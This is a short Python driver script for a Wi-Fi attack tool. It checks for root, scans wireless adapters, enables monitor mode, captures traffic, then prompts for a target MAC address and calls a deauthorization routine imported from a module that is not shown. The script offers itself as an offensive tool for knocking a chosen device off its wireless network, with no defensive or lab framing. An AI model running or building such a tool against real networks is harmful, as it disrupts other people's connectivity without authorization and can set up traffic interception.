from network_capture import scan_adapters, start_monitor_mode, capture_network
from deauth import *
import os
import sys
import time

# Check if running as root
if os.geteuid() != 0:
    print("This script must be run as root. Please use 'sudo'.")
    sys.exit(1)

if __name__ == "__main__":
    scan_adapters()
    adapter_name = start_monitor_mode()
    if adapter_name:
        time.sleep(2)
        capture_network(adapter_name)

        target_mac = input("Enter the target MAC address: ")
        deauthorization(target_mac, adapter_name)